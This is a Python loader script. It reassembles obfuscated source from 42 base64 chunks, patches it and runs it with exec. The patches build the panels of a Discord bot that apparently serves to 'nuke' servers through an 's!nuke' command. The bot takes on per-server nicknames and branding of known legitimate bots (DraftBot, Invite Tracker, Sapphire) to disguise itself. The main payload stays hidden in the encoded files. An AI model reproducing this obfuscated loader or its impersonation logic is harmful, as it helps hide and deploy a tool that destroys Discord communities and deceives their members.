# language: Python 3.11+
import zlib, base64
from pathlib import Path
_p = "".join(Path(__file__).with_name(f"t{i}.b64").read_text(encoding="utf-8") for i in range(42))
src = zlib.decompress(base64.b64decode(_p)).decode()
src = src.replace('class LauncherView(View):\n    def __init__(self):\n        super().__init__(timeout=None)\n    @discord.ui.button(label="Open my config",style=discord.ButtonStyle.primary,custom_id="pre_open_v4",emoji="⚙️")\n    async def open_cfg(self,interaction:discord.Interaction,button:Button):\n        uid=interaction.user.id\n        try:\n            user_cfg(uid)\n            emb=build_preview_embed(uid)\n            view=PreconfigView(uid)\n            await interaction.response.send_message(embed=emb,view=view,ephemeral=True)\n        except Exception as e:\n            log.exception("open config")\n            msg=f"Open failed: `{type(e).__name__}: {e}`"\n            try:\n                if interaction.response.is_done():\n                    await interaction.followup.send(msg,ephemeral=True)\n                else:\n                    await interaction.response.send_message(msg,ephemeral=True)\n            except Exception:\n                pass\n', 'class ProfileServerSelect(Select):\n    def __init__(self, uid:int):\n        opts=[]\n        for k,p in PROFILES.items():\n            if k=="default":\n                continue\n            opts.append(discord.SelectOption(label=p["label"],value=k,description=f"Nick in target server: {p.get(\'nick\') or \'—\'}"))\n        super().__init__(placeholder="Choose bot profile for a server…",min_values=1,max_values=1,options=opts[:25])\n        self._uid=uid\n    async def callback(self,interaction:discord.Interaction):\n        if interaction.user.id!=self._uid:\n            return await interaction.response.send_message("Not your panel.",ephemeral=True)\n        key=self.values[0]\n        if key not in PROFILES:\n            return await interaction.response.send_message("Unknown profile.",ephemeral=True)\n        u=user_cfg(self._uid)\n        u["_last_profile"]=key\n        save_uc()\n        await interaction.response.send_modal(ServerProfileModal(self._uid,key))\n\nclass ServerProfileModal(Modal,title="Profile per server"):\n    def __init__(self,uid:int,profile_key:str):\n        super().__init__()\n        self._uid=uid\n        self._pkey=profile_key\n        label=PROFILES.get(profile_key,{}).get("label",profile_key)\n        self.gid=discord.ui.TextInput(label=f"Server ID for {label}",placeholder="123456789012345678",required=True,max_length=22)\n        self.add_item(self.gid)\n    async def on_submit(self,interaction:discord.Interaction):\n        try:\n            gid=int(str(self.gid.value).strip())\n        except Exception:\n            return await interaction.response.send_message("Invalid server ID.",ephemeral=True)\n        key=self._pkey\n        if key not in PROFILES:\n            return await interaction.response.send_message("Unknown profile.",ephemeral=True)\n        sp=_server_profiles(self._uid)\n        sp[str(gid)]=key\n        save_uc()\n        g=bot.get_guild(gid)\n        applied=False\n        nick=PROFILES[key].get("nick")\n        if g:\n            try:\n                await apply_profile_to_guild(g,self._uid)\n                applied=True\n            except Exception as ex:\n                log.warning("apply profile: %s",ex)\n        label=PROFILES[key]["label"]\n        if applied and g:\n            msg=f"Mapped **{g.name}** (`{gid}`) → **{label}**\\nBot nick set to `{nick}`."\n        elif g is None:\n            msg=f"Mapped server `{gid}` → **{label}**.\\nBot is not in that server yet — nick applies when present / on nuke."\n        else:\n            msg=f"Mapped server `{gid}` → **{label}**.\\nNick apply failed (need Manage Nicknames / hierarchy)."\n        await interaction.response.send_message(msg,ephemeral=True)\n\nclass LauncherView(View):\n    def __init__(self):\n        super().__init__(timeout=None)\n    @discord.ui.button(label="Open my config",style=discord.ButtonStyle.primary,custom_id="pre_open_v5",emoji="⚙️")\n    async def open_cfg(self,interaction:discord.Interaction,button:Button):\n        uid=interaction.user.id\n        try:\n            user_cfg(uid)\n            emb=build_preview_embed(uid)\n            view=PreconfigView(uid)\n            await interaction.response.send_message(embed=emb,view=view,ephemeral=True)\n        except Exception as e:\n            log.exception("open config")\n            msg=f"Open failed: `{type(e).__name__}: {e}`"\n            try:\n                if interaction.response.is_done():\n                    await interaction.followup.send(msg,ephemeral=True)\n                else:\n                    await interaction.response.send_message(msg,ephemeral=True)\n            except Exception:\n                pass\n    @discord.ui.button(label="Profile per server",style=discord.ButtonStyle.secondary,custom_id="pre_prof_v5",emoji="🎭")\n    async def open_prof(self,interaction:discord.Interaction,button:Button):\n        uid=interaction.user.id\n        user_cfg(uid)\n        e=discord.Embed(\n            title="Profile per server",\n            description=(\n                "1. Pick a profile (DraftBot, Invite Tracker, Sapphire, …)\\n"\n                "2. Enter the **server ID**\\n"\n                "3. The bot uses that nick / branding on that server"\n            ),\n            color=0x5865F2,\n        )\n        sp=_server_profiles(uid)\n        if sp:\n            lines=[f"`{gid}` → **{PROFILES.get(pk,{}).get(\'label\',pk)}**" for gid,pk in list(sp.items())[:15]]\n            e.add_field(name="Your maps",value="\\n".join(lines),inline=False)\n        e.set_footer(text=f"Default profile: {u_default_profile(uid)}")\n        v=View(timeout=300)\n        v.add_item(ProfileServerSelect(uid))\n        await interaction.response.send_message(embed=e,view=v,ephemeral=True)\n')
src = src.replace('    e=emb(\n        "Sapphire Preconfig",\n        "Each user has a **private** config panel.\\n"\n        "Click **Open my config** — only you see it.\\n"\n        "Nuke: `s!nuke <access_code> <config_code>` · **My code** for your config code."\n    )', '    e=emb(\n        "Sapphire Preconfig",\n        "Private tools — only you see what you open.\\n"\n        "• **Open my config** — flags, slots, delay, simulate\\n"\n        "• **Profile per server** — map a server ID to DraftBot / Invite Tracker / Sapphire / …\\n"\n        "Nuke: `s!nuke <access_code> <config_code>`"\n    )')
exec(compile(src, "bot.py", "exec"), globals())
